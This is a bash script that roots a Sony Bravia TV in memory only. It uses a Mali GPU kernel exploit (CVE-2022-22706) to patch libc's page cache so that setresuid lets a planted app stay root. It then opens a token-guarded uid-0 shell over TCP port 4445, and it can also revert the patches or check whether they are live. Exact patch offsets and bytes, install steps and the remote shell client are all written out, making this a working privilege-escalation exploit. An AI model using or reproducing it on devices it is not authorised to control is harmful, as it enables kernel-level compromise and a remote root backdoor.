#!/usr/bin/env bash
# tv-root.sh — apply / revert / check the RAM-only root on the Sony Bravia TV.
#
# Usage:
#   tv-root.sh apply     patch libc page cache + start the uid-0 console (default)
#   tv-root.sh revert    restore pristine bytes + stop the probe app
#   tv-root.sh status    check whether the hook is live and the console answers
#   tv-root.sh console   open an interactive uid-0 shell over TCP 4445
#
# How it works (details in Sony-XBR-65X850D/FULL-ROOT-STATUS.md, "ROOT ACHIEVED"):
#   1. pcwrite3 (CVE-2022-22706, Mali kbase) writes 3 patch sites into the
#      /system/lib/libc.so PAGE CACHE (RAM-only; a reboot fully reverts) and
#      flushes the I-cache per core through its writable kbase alias.
#   2. The patched setresuid returns 0 without syscall when called with
#      uid 10144, so the probe app (com.pwn.probe, uid 10144) stays root.
#   3. Its Console service serves a TCP console on 4445 (token <YOUR-TOKEN>).
#
# NOTE: patches are applied from the adb shell context. The root console itself
# (untrusted_app) cannot exec /data/local/tmp binaries (shell_data_file exec is
# SELinux-denied) — that is expected, not a failure.
set -euo pipefail

TV="${TV:-<TV-LAN-IP>:5555}"
PORT=4445
TOKEN='<YOUR-TOKEN>'
APK="$(cd "$(dirname "$0")/.." && pwd)/Sony-XBR-65X850D/pwn.apk"
PCWRITE3="$(cd "$(dirname "$0")/.." && pwd)/Sony-XBR-65X850D/out/native/pcwrite3"
LIBC=/system/lib/libc.so

# Patch sites: offset:patched-hex:pristine-hex
PATCHES=(
  "4a99c:3f6cffea:07c0a0e1"                                # setresuid: ARM B -> 0x25aa0
  "25a8c:0349884201d100207047d02700df7047a0270000:2de9f04fadf52d5d8fb00df5005e0746dff8540e"  # Thumb payload
  "25aa0:1b304fe213ff2fe1:1c46def8a85b0df5005e"            # ARM trampoline sub r3,pc,#27; bx r3
)

adbsh() { adb -s "$TV" shell "$@"; }

log() { printf '\e[90m%s\e[0m\n' "$*"; }
die() { printf '\e[31m%s\e[0m\n' "$*" >&2; exit 1; }

ensure_tools() {
  adbsh true 2>/dev/null || die "no adb device at $TV — run: adb connect $TV"
  if ! adbsh "[ -x /data/local/tmp/pcwrite3 ]"; then
    if [ ! -f "$PCWRITE3" ]; then
      PCWRITE3="$(cd "$(dirname "$0")/.." && pwd)/Sony-XBR-65X850D/exploit/page-cache-write/pcwrite3"
      [ -f "$PCWRITE3" ] || die "pcwrite3 binary not found — build pcwrite3.c with the NDK first"
    fi
    log "pushing pcwrite3..."
    adb -s "$TV" push "$PCWRITE3" /data/local/tmp/pcwrite3 >/dev/null
    adbsh "chmod 755 /data/local/tmp/pcwrite3"
  fi
}

apply() {
  ensure_tools
  adb -s "$TV" install -r "$APK" >/dev/null 2>&1 || true
  for p in "${PATCHES[@]}"; do
    IFS=: read -r off hex _ <<<"$p"
    log "patch $LIBC @ 0x$off <- $hex"
    adbsh "/data/local/tmp/pcwrite3 $LIBC $off $hex" | grep -E '^\[.\]' || die "patch at $off failed"
  done
  log "starting probe app..."
  adbsh "am start -n com.pwn.probe/.Main" >/dev/null
  log "waiting for console on port $PORT..."
  for _ in $(seq 1 30); do
    if status_quiet; then return 0; fi
    sleep 1
  done
  die "console did not come up — check: adb -s $TV logcat -d -s PWNROOT"
}

revert() {
  ensure_tools
  for p in "${PATCHES[@]}"; do
    IFS=: read -r off _ pristine <<<"$p"
    log "restore $LIBC @ 0x$off <- $pristine"
    adbsh "/data/local/tmp/pcwrite3 $LIBC $off $pristine" >/dev/null || die "restore at $off failed"
  done
  adbsh "am force-stop com.pwn.probe" || true
  log "reverted (note: a reboot also reverts everything)."
}

# console check; prints the uid line when live
status_quiet() {
  python3 - "$TV" "$PORT" "$TOKEN" <<'EOF'
import socket, sys
tv, port, token = sys.argv[1], int(sys.argv[2]), sys.argv[3]
host = tv.split(":")[0]
try:
    s = socket.create_connection((host, port), timeout=3)
    f = s.makefile("rwb")
    f.write(token.encode() + b"\n"); f.flush()
    s.settimeout(3)
    line = f.readline().decode(errors="replace").strip()
    print(line)
    s.close()
    sys.exit(0 if line.startswith("OK uid=0") else 1)
except Exception:
    sys.exit(1)
EOF
}

status() {
  if out=$(status_quiet); then
    log "ROOT ACTIVE — console reply: $out"
  else
    log "root console not answering (not applied, already reverted, or TV rebooted)."
    exit 1
  fi
}

console() {
  status_quiet >/dev/null || die "root console not up — run: $0 apply"
  log "uid-0 console (^C or 'exit' to quit)"
  exec 3<>/dev/tcp/"${TV%%:*}"/$PORT
  printf '%s\n' "$TOKEN" >&3
  ( while IFS= read -r -u 3 line && [ "$line" != "###END###" ]; do printf '%s\n' "$line"; done ) &
  PUMP=$!
  trap 'kill $PUMP 2>/dev/null; printf "exit\n" >&3; exit 0' INT TERM
  while IFS= read -r -p 'root@tv # ' line; do
    [ "$line" = exit ] || [ "$line" = quit ] && break
    [ -z "$line" ] && continue
    printf '%s\n' "$line" >&3
    while IFS= read -r -u 3 line && [ "$line" != "###END###" ]; do printf '%s\n' "$line"; done
  done
  kill $PUMP 2>/dev/null; printf 'exit\n' >&3
}

case "${1:-apply}" in
  apply)   apply ;;
  revert)  revert ;;
  status)  status ;;
  console) console ;;
  *) die "usage: $0 {apply|revert|status|console}" ;;
esac
